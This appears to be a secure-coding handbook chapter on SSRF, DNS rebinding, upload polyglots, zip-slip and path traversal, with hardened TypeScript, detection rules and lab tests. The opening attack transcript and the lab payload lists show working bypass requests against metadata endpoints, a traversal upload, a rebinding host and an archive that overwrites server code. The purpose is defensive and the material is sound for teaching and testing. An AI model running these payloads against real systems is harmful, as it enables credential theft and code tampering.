# SSRF, DNS Rebinding, Malicious File Uploads, Archive Extraction & Path Traversal

## 1. Attack Transcript

```text
# (a) Cloud metadata via a "link preview" feature
$ curl -s -X POST https://app.example.com/api/preview -H "Cookie: $B" -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
{"error":"Blocked host"}
$ curl -s -X POST https://app.example.com/api/preview -H "Cookie: $B" -d '{"url":"http://[::ffff:a9fe:a9fe]/latest/meta-data/iam/security-credentials/"}'
{"title":"app-instance-role","body":"{\"AccessKeyId\":\"ASIA...\",\"SecretAccessKey\":\"...\"}"}

# (b) DNS rebinding: attacker's authoritative server answers TTL=0, alternating answers
$ dig +short rebind.attacker.example   ->  93.184.216.34     # validation lookup (public)
$ dig +short rebind.attacker.example   ->  127.0.0.1         # the lookup fetch() performs 5 ms later
$ curl -s -X POST .../api/preview -d '{"url":"http://rebind.attacker.example:8080/admin"}'

# (c) Redirect hop
$ curl -s -X POST .../api/preview -d '{"url":"https://attacker.example/r"}'   # 302 Location: http://10.0.0.5:9200/_cat/indices

# (d) Upload: renamed polyglot and traversal in the filename
$ curl -s -X POST .../api/upload -H "Cookie: $B" \
    -F 'file=@payload.svg;filename=../../../var/app/public/avatar.html;type=image/png'
{"url":"https://app.example.com/uploads/avatar.html"}
$ curl -s https://app.example.com/uploads/avatar.html     # <svg onload=fetch('/api/me')...> runs on the app's origin

# (e) Archive import: zip-slip + zip bomb
$ python3 -c "import zipfile;z=zipfile.ZipFile('x.zip','w');z.writestr('../../app/server.js','process.exit()');z.close()"
$ curl -s -X POST .../api/import -F file=@x.zip            # overwrites application code
$ curl -s -X POST .../api/import -F file=@42.zip            # 42 KB -> 4.5 PB on extraction
```

---

## 2. Spot the Bug

```typescript
import path from "node:path";
import fs from "node:fs/promises";

export async function fetchPreview(targetUrl: string) {
  const parsed = new URL(targetUrl);
  if (parsed.hostname === "localhost" || parsed.hostname === "127.0.0.1") {
    throw new Error("Blocked host");
  }
  return fetch(targetUrl);
}

export async function saveUpload(userFilename: string, bytes: Uint8Array) {
  const dest = path.join("/var/app/uploads", userFilename);
  await fs.writeFile(dest, bytes);
}
```

```typescript
import dns from "node:dns/promises";
import net from "node:net";

export function isPublicRoutableIp(ip: string): boolean {
  if (net.isIPv4(ip)) {
    const [a, b] = ip.split(".").map(Number);
    if (a === 0 || a === 10 || a === 127) return false;
    if (a === 169 && b === 254) return false;
    if (a === 172 && b >= 16 && b <= 31) return false;
    if (a === 192 && b === 168) return false;
    if (a === 100 && b >= 64 && b <= 127) return false;
    if (a >= 224) return false;
    return true;
  }
  if (net.isIPv6(ip)) {
    const n = ip.toLowerCase();
    if (n === "::1" || n === "::") return false;
    if (n.startsWith("fe80:") || n.startsWith("fc") || n.startsWith("fd")) return false;
    if (n.includes("::ffff:")) {
      const v4 = n.split("::ffff:")[1];
      return v4 ? isPublicRoutableIp(v4) : false;
    }
    return true;
  }
  return false;
}

export async function safeExternalFetch(rawUrl: string, timeoutMs = 5000): Promise<Response> {
  const parsed = new URL(rawUrl);
  if (parsed.protocol !== "https:" && parsed.protocol !== "http:") throw new Error("SSRF_BLOCKED_SCHEME");
  const records = await dns.lookup(parsed.hostname, { all: true, verbatim: true });
  for (const r of records) {
    if (!isPublicRoutableIp(r.address)) throw new Error(`SSRF_BLOCKED_PRIVATE_IP: ${r.address}`);
  }
  return fetch(parsed.toString(), { redirect: "error", signal: AbortSignal.timeout(timeoutMs) });
}
```

<details>
<summary>Reveal</summary>

1. `fetchPreview` blocks two spellings. Bypasses: `169.254.169.254`, `[::1]`, decimal/hex/octal IPv4, `[::ffff:a9fe:a9fe]`, a 302 to an internal address, and DNS rebinding.
2. `saveUpload` joins a client filename into the path: `../../` escapes the base, `/etc/cron.d/x` overwrites absolutely, and `.html`/`.svg` served inline run script on the application origin.
3. `safeExternalFetch` is a decent pre-check that **does not pin the address**: `dns.lookup` validates one answer, then `fetch()` resolves again and may connect to a different one (DNS rebinding). Also: the range list is incomplete (`192.0.0.0/24`, `198.18.0.0/15`, documentation ranges, `64:ff9b::/96` NAT64, `2002::/16` 6to4, only `fe80:` instead of the whole `fe80::/10`), and `redirect:"error"` makes every legitimate redirect fail while no manual re-validation exists.

</details>

---

## 3. Invariant Violated & Mechanism

- **Invariant Violated:** `I4 — Context-Safe Boundary Parsing` (OWASP ASVS `v5.0.0-1.2.2`, `3.2.1`, `5.2.1`, `5.2.2`, `5.3.1`, `5.3.2`).
- **Mechanism:**
  1. **Server-Side Request Forgery (SSRF) & DNS Rebinding:** any feature that fetches a user-supplied URL (webhook testers, link previews/OpenGraph scrapers, avatar importers, PDF/screenshot renderers, MCP fetch tools, RSS importers) lets an attacker probe internal services (`127.0.0.1:8080/admin`, Redis, Kubernetes) or cloud metadata (`169.254.169.254`, `fd00:ec2::254`, `168.63.129.16`). Naive string checks are bypassed by alternate IP encodings, open redirects to internal IPs, IPv4-mapped/embedded IPv6, and **DNS rebinding** (public IP at validation, internal IP at connect).
  2. **Polyglot / Active File Uploads:** trusting the client `Content-Type` or extension, storing under `file.name`, or serving `.svg`/`.html`/`.xml` inline from the application origin.
  3. **Archive extraction:** zip-slip (entry names with `..`, absolute paths, backslashes, symlinks), zip bombs (huge expansion ratios, nested archives), and entry-count floods.
  4. **Image decoding:** pixel-flood (a small file declaring 60000×60000 pixels), metadata (EXIF GPS, embedded profiles) leaking to other users, polyglots that are valid images *and* valid scripts.
- **Why Happy-Path Tests Miss It:** tests fetch `https://example.com`, upload a real PNG named `avatar.png`, and import a normal archive.

### Where It Hides

- Outbound webhook configuration and test-delivery endpoints (`POST /api/webhooks/test`).
- Link unfurling, RSS/sitemap importers, image proxies (`/api/image-proxy?url=…`), headless-browser PDF/screenshot workers, OAuth/OIDC discovery (`.well-known` fetches), JWKS URL fetchers, "import from URL".
- Upload handlers writing to disk (`path.join(UPLOAD_DIR, file.name)`) or copying the client `file.type` into S3/R2 metadata; ZIP/TAR/CSV importers; thumbnailers.
- Background workers that fetch URLs on behalf of users with service credentials (see [`../authorization-and-tenancy/async-jobs-and-scope-propagation.md`](../authorization-and-tenancy/async-jobs-and-scope-propagation.md)); preview caches keyed by URL without the tenant (see [`../authorization-and-tenancy/cache-and-derived-data.md`](../authorization-and-tenancy/cache-and-derived-data.md)).

---

## 4. Hardened Pattern

### 4.1 Address classification with a complete deny list (`node:net` `BlockList`)

`BlockList` evaluates IPv4 and IPv6 consistently; the list below is deny-by-default for everything that is not global unicast.

```typescript
import net from "node:net";

const deny = new net.BlockList();
const V4: ReadonlyArray<[string, number]> = [
  ["0.0.0.0", 8],        // "this network"
  ["10.0.0.0", 8],       // RFC1918
  ["100.64.0.0", 10],    // CGNAT (also Alibaba metadata 100.100.100.200, Tailscale)
  ["127.0.0.0", 8],      // loopback
  ["169.254.0.0", 16],   // link-local, cloud metadata
  ["172.16.0.0", 12],    // RFC1918
  ["192.0.0.0", 24],     // IETF protocol assignments
  ["192.0.2.0", 24],     // TEST-NET-1
  ["192.88.99.0", 24],   // 6to4 relay (deprecated)
  ["192.168.0.0", 16],   // RFC1918
  ["198.18.0.0", 15],    // benchmarking
  ["198.51.100.0", 24],  // TEST-NET-2
  ["203.0.113.0", 24],   // TEST-NET-3
  ["224.0.0.0", 4],      // multicast
  ["240.0.0.0", 4],      // reserved + broadcast
  ["168.63.129.16", 32], // Azure wire server / metadata helper (public-looking)
];
const V6: ReadonlyArray<[string, number]> = [
  ["::", 128], ["::1", 128],
  ["::ffff:0:0", 96],    // IPv4-mapped: a public target never needs this form
  ["64:ff9b::", 96],     // NAT64 (embeds an IPv4)
  ["64:ff9b:1::", 48],   // local-use NAT64
  ["100::", 64],         // discard-only
  ["2001::", 23],        // IETF protocol assignments (Teredo etc.)
  ["2001:db8::", 32],    // documentation
  ["2002::", 16],        // 6to4 (embeds an IPv4)
  ["fc00::", 7],         // unique local, includes fd00:ec2::254
  ["fe80::", 10],        // link-local (the WHOLE /10: fe80..febf)
  ["fec0::", 10],        // deprecated site-local
  ["ff00::", 8],         // multicast
];
for (const [a, p] of V4) deny.addSubnet(a, p, "ipv4");
for (const [a, p] of V6) deny.addSubnet(a, p, "ipv6");

export function isPublicRoutableIp(ip: string): boolean {
  const bare = ip.replace(/^\[|\]$/g, "").split("%")[0];
  if (net.isIPv4(bare)) return !deny.check(bare, "ipv4");
  if (net.isIPv6(bare)) return !deny.check(bare, "ipv6");
  return false; // anything that is not a literal IP is not classified here
}
```

### 4.2 Pin the validated address at connect time (closes DNS rebinding)

Validate inside the resolver the socket itself uses, so there is no second lookup to race:

```typescript
import dns from "node:dns";
import { Agent, fetch as undiciFetch } from "undici";

const guardedLookup = (
  hostname: string,
  options: dns.LookupOptions,
  cb: (err: NodeJS.ErrnoException | null, address: any, family?: number) => void
) => {
  dns.lookup(hostname, { ...options, all: true }, (err, addrs) => {
    if (err) return cb(err, "", 0);
    const list = addrs as dns.LookupAddress[];
    if (list.length === 0 || list.some((a) => !isPublicRoutableIp(a.address))) {
      return cb(Object.assign(new Error("SSRF_BLOCKED_PRIVATE_IP"), { code: "ESSRF" }), "", 0);
    }
    // The socket connects to exactly the addresses we just validated.
    if (options.all) return cb(null, list);
    cb(null, list[0].address, list[0].family);
  });
};

const ssrfSafeAgent = new Agent({
  connect: { lookup: guardedLookup as any, timeout: 5_000 },
  headersTimeout: 5_000,
  bodyTimeout: 10_000,
  maxResponseSize: 2 * 1024 * 1024,
});
```

IP-literal hostnames skip the resolver entirely, so they must be classified explicitly before the request (next section does this). Strongest alternative: route all user-URL fetches through a dedicated egress proxy or network segment with no route to private ranges or metadata, so a bug in this code is not a breach.

### 4.3 Manual redirect loop with per-hop validation

```typescript
const MAX_REDIRECTS = 3;
const ALLOWED_PORTS = new Set(["", "80", "443"]);

function assertFetchableUrl(u: URL): void {
  if (u.protocol !== "https:" && u.protocol !== "http:") throw new Error("SSRF_BLOCKED_SCHEME");
  if (u.username || u.password) throw new Error("SSRF_BLOCKED_CREDENTIALS_IN_URL");
  if (!ALLOWED_PORTS.has(u.port)) throw new Error("SSRF_BLOCKED_PORT");
  const host = u.hostname.replace(/^\[|\]$/g, "");
  // WHATWG URL already normalizes 2130706433, 0x7f.1, 017700000001 to dotted 127.0.0.1.
  if (net.isIP(host) && !isPublicRoutableIp(host)) throw new Error("SSRF_BLOCKED_PRIVATE_IP");
}

export async function safeExternalFetch(rawUrl: string, timeoutMs = 8_000) {
  let current = new URL(rawUrl);
  for (let hop = 0; hop <= MAX_REDIRECTS; hop++) {
    assertFetchableUrl(current);
    const res = await undiciFetch(current.toString(), {
      method: "GET",
      redirect: "manual",                    // we validate every hop ourselves
      dispatcher: ssrfSafeAgent,             // connect-time pinning on every hop
      signal: AbortSignal.timeout(timeoutMs),
      headers: { "user-agent": "app-preview/1.0" }, // never forward caller cookies or auth headers
    });
    if (res.status >= 300 && res.status < 400 && res.headers.get("location")) {
      current = new URL(res.headers.get("location")!, current); // resolve relative redirects
      continue;
    }
    return res;
  }
  throw new Error("SSRF_TOO_MANY_REDIRECTS");
}
```

Also cap the response size and content type you accept (`text/html`, `image/*`), never return raw upstream bodies or headers to the caller in full, and never log them with credentials.

### 4.4 Uploads: magic bytes, re-encode, strip metadata, UUID paths

```typescript
import path from "node:path";
import crypto from "node:crypto";
import sharp from "sharp";

const ALLOWED_IMAGE_MAGIC = [
  { ext: "png", mime: "image/png", matches: (b: Uint8Array) => b.length >= 8 && b[0] === 0x89 && b[1] === 0x50 && b[2] === 0x4e && b[3] === 0x47 },
  { ext: "jpg", mime: "image/jpeg", matches: (b: Uint8Array) => b.length >= 3 && b[0] === 0xff && b[1] === 0xd8 && b[2] === 0xff },
  { ext: "webp", mime: "image/webp", matches: (b: Uint8Array) => b.length >= 12 && b[0] === 0x52 && b[1] === 0x49 && b[2] === 0x46 && b[3] === 0x46 && b[8] === 0x57 && b[9] === 0x45 && b[10] === 0x42 && b[11] === 0x50 },
] as const;

const UUID_RE = /^[0-9a-f]{8}-[0-9a-f]{4}-[1-8][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i;

export async function processImageUpload(
  baseDir: string,
  tenantId: string,
  bytes: Uint8Array,
  maxBytes = 5 * 1024 * 1024
): Promise<{ diskPath: string; contentType: string; data: Buffer }> {
  if (!UUID_RE.test(tenantId)) throw new Error("INVALID_TENANT_ID");
  if (bytes.byteLength === 0 || bytes.byteLength > maxBytes) throw new Error("UPLOAD_SIZE_OUT_OF_BOUNDS");

  // 1. Magic bytes decide the type; never the client Content-Type, never the filename. SVG/HTML are refused.
  const matched = ALLOWED_IMAGE_MAGIC.find((m) => m.matches(bytes));
  if (!matched) throw new Error("UPLOAD_MAGIC_BYTES_REJECTED");

  // 2. Re-encode: defeats polyglots and trailing payloads, applies EXIF orientation, drops ALL metadata
  //    (EXIF GPS, ICC, XMP). limitInputPixels stops pixel-flood decompression bombs.
  const data = await sharp(Buffer.from(bytes), { limitInputPixels: 24_000_000, failOn: "error" })
    .rotate()                          // bake in orientation, then metadata is not copied
    .resize({ width: 4096, height: 4096, fit: "inside", withoutEnlargement: true })
    .toFormat(matched.ext === "jpg" ? "jpeg" : (matched.ext as "png" | "webp"))
    .toBuffer();

  // 3. Path built from internal identifiers only, canonical-prefix asserted.
  const resolvedBase = path.resolve(baseDir);
  const candidate = path.resolve(resolvedBase, tenantId, `${crypto.randomUUID()}.${matched.ext}`);
  if (!candidate.startsWith(resolvedBase + path.sep)) throw new Error("PATH_TRAVERSAL_DETECTED");

  return { diskPath: candidate, contentType: matched.mime, data };
}
```

Serving: always `Content-Type` from your stored value, `X-Content-Type-Options: nosniff`, `Content-Disposition: attachment` for non-images, and **from a separate registrable domain** (for example `example-usercontent.net`, not `usercontent.example.com`) so a script that does run cannot read the application's cookies or storage and subdomain cookie tossing is impossible. See [`browser-boundary.md`](browser-boundary.md).

### 4.5 Archive extraction: validate names, ratios, counts and *actual* bytes

```typescript
export interface ArchiveEntry {
  readonly name: string;
  readonly isSymlink: boolean;
  readonly declaredUncompressedSize: number;
  readonly compressedSize: number;
}

export interface ExtractLimits {
  readonly maxEntries: number;            // e.g. 2_000
  readonly maxTotalBytes: number;         // e.g. 100 * 1024 * 1024
  readonly maxEntryBytes: number;         // e.g. 20 * 1024 * 1024
  readonly maxRatio: number;              // e.g. 100 (uncompressed / compressed)
  readonly maxDepthOfNestedArchives: 0;   // do not recurse into archives inside archives
}

export function safeExtractTarget(baseDir: string, entryName: string): string {
  if (entryName.includes("\0") || entryName.includes("\\") || path.isAbsolute(entryName) || /^[A-Za-z]:/.test(entryName)) {
    throw new Error("ARCHIVE_UNSAFE_NAME");
  }
  const base = path.resolve(baseDir);
  const target = path.resolve(base, entryName);
  if (!target.startsWith(base + path.sep)) throw new Error("ARCHIVE_PATH_TRAVERSAL");
  return target;
}

export function preflightArchive(entries: readonly ArchiveEntry[], baseDir: string, lim: ExtractLimits): void {
  if (entries.length > lim.maxEntries) throw new Error("ARCHIVE_TOO_MANY_ENTRIES");
  let total = 0;
  for (const e of entries) {
    if (e.isSymlink) throw new Error("ARCHIVE_SYMLINK_REJECTED");
    safeExtractTarget(baseDir, e.name);
    if (e.declaredUncompressedSize > lim.maxEntryBytes) throw new Error("ARCHIVE_ENTRY_TOO_LARGE");
    if (e.compressedSize > 0 && e.declaredUncompressedSize / e.compressedSize > lim.maxRatio) {
      throw new Error("ARCHIVE_RATIO_REJECTED");
    }
    total += e.declaredUncompressedSize;
    if (total > lim.maxTotalBytes) throw new Error("ARCHIVE_TOTAL_TOO_LARGE");
  }
}
// Headers lie. While streaming each entry to disk, count the bytes ACTUALLY written and abort at
// maxEntryBytes / maxTotalBytes. Write files with O_EXCL (flag "wx") so an entry can never overwrite one.
```

---

## 5. Residual Edge Cases (Why the Hardened Version Is Still Not Enough)

- **Proxies and environment:** if `HTTP(S)_PROXY` is honored by your HTTP client, the proxy resolves the name, so `guardedLookup` never sees it. Disable ambient proxy support for user-URL fetches or make the proxy the enforcement point.
- **Connection reuse:** a pooled keep-alive socket opened earlier to an address that later became internal is reused without a new lookup. Use short `keepAliveTimeout`, and disable pooling across tenants for this agent.
- **HTTP-level SSRF:** `Host` header smuggling, `gopher://` and `file://` (blocked by scheme allowlist), request smuggling through user-controlled header values. Do not let callers set headers.
- **Blind SSRF:** the response never returns to the caller but the request still happened (state-changing GET on an internal service). Egress network controls are the only reliable defense.
- **Allowed port list vs. real services:** `80/443` on an internal host is still reachable via a public name that points inward; the connect-time classification covers this, a hostname allowlist is stronger when the feature allows it.
- **Image bombs beyond pixels:** animated GIF/WebP frame counts, huge ICC profiles, SVG-to-PNG converters (refuse SVG) and PDF renderers (run in a sandbox with no network).
- **Decompression via content-encoding:** cap decoded bytes of fetched responses, not just compressed bytes.
- **TOCTOU on disk:** between validating `candidate` and writing, a symlink in a shared directory can redirect the write; write to private directories owned by the service user with `O_EXCL | O_NOFOLLOW` where supported.
- **Cache poisoning of previews:** keyed by URL only, one tenant's private page preview is served to another ([`../authorization-and-tenancy/cache-and-derived-data.md`](../authorization-and-tenancy/cache-and-derived-data.md)).

---

## 6. How to Discover It Automatically

### A. Static

```yaml
# semgrep
rules:
  - id: server-fetch-non-literal-url
    languages: [typescript, javascript]
    severity: WARNING
    message: Server-side request with a non-literal URL; route through safeExternalFetch
    patterns:
      - pattern-either:
          - pattern: fetch($URL, ...)
          - pattern: axios.get($URL, ...)
          - pattern: axios($URL, ...)
          - pattern: got($URL, ...)
          - pattern: undici.fetch($URL, ...)
      - pattern-not: fetch("...", ...)
  - id: path-join-with-request-input
    languages: [typescript, javascript]
    severity: WARNING
    message: path.join/resolve with non-literal segment; build storage paths from internal UUIDs
    pattern-either:
      - pattern: path.join($BASE, $X)
      - pattern: path.resolve($BASE, $X)
```

```bash
rg -n 'fetch\(\s*[^"\x27`]' src/
rg -n 'path\.(join|resolve)\(' src/
rg -n "redirect:\s*['\"](follow|error)['\"]" src/       # follow = unvalidated hops; error = no hop validation
rg -n 'HTTP_PROXY|HTTPS_PROXY|ProxyAgent|setGlobalDispatcher' src/
rg -n 'file\.(name|originalname|filename)|req\.file\.' src/
rg -n 'extractAll|extractTo|unzip|tar\.x|yauzl|adm-zip|decompress' src/
```

### B. Dynamic Attacker Test (lab with SSRF canary listeners, a rebinding DNS resolver and a redirector)

1. **Targets in the lab** ([`../../2-discovery-and-attacker-methods/isolated-lab-and-canary-setup.md`](../../2-discovery-and-attacker-methods/isolated-lab-and-canary-setup.md)): a loopback canary listener, a metadata-style mock on `169.254.169.254` (via a lab network alias), an RFC1918 listener, a rebinding DNS server that returns a public address first and `127.0.0.1` second, and an external redirector that 302s to each.
2. **Pass every URL-accepting parameter (`webhookUrl`, `avatarUrl`, `previewUrl`, `importUrl`, OAuth discovery URLs):**
   - `http://127.0.0.1:19999/secret`, `http://localhost:19999/secret`, `http://[::1]:19999/secret`
   - `http://[::ffff:127.0.0.1]:19999/secret`, `http://[::ffff:7f00:1]/`, `http://2130706433:19999/`, `http://0x7f.1:19999/`, `http://017700000001:19999/`
   - `http://[64:ff9b::7f00:1]/`, `http://[2002:7f00:1::]/`, `http://[fe90::1]/`, `http://198.18.0.1/`, `http://192.0.0.1/`
   - `http://rebind.lab.test:19999/` (rebinding), a redirect chain of 1, 3 and 4 hops ending on each internal target, `gopher://`, `file:///etc/passwd`
3. **Pass criteria:** the canary listeners record zero hits, `flag{CANARY_SSRF_INTERNAL}` never appears in any response or log, redirect chains longer than 3 hops fail, and a legitimate public URL with one redirect still works.
4. **Upload tests:** upload an SVG/HTML renamed `avatar.png`, a PNG with trailing script bytes, a 60000×60000 PNG, a JPEG with GPS EXIF, and a file named `../../../tmp/traversal_canary` → rejected or re-encoded without metadata; `/tmp/traversal_canary` never exists.
5. **Archive tests:** zip-slip names (`../x`, `/abs`, `..\x`), a symlink entry, a 100:1 ratio bomb, 100 000 empty entries, a nested archive → all rejected; no file outside the extraction directory.

Wire this battery into [`../../2-discovery-and-attacker-methods/deterministic-oracle-sweep.md`](../../2-discovery-and-attacker-methods/deterministic-oracle-sweep.md).

---

## 7. How to Eliminate the Bug Class by Construction

1. **Ban direct `fetch`/`axios`/`got` for user-controlled URLs:** all such calls go through `safeExternalFetch`, built on an `undici.Agent` with a validating `lookup` (`reqwest` with a custom `DnsResolver` and an `ip.is_global()`-style check in Rust). Lint non-literal fetches outside that module.
2. **Network-level egress control:** run URL-fetching workers in a segment with no route to private ranges or metadata, and require IMDSv2 / hop-limit 1 (or disable the metadata service for the workload).
3. **Never use client filenames in storage paths:** store a sanitized display name as a database column used only in `Content-Disposition`; key objects by `crypto.randomUUID()` under `tenants/{tenant_uuid}/…`.
4. **Re-encode every upload you intend to render; refuse SVG/HTML/XML for image fields.**
5. **Serve user content from a separate registrable domain** with `nosniff`, a sandboxing CSP and attachment disposition for non-images.
6. **Archive extraction is a library you write once:** names validated, ratios and counts enforced, bytes counted as written, `O_EXCL`, no symlinks, no nested archives.
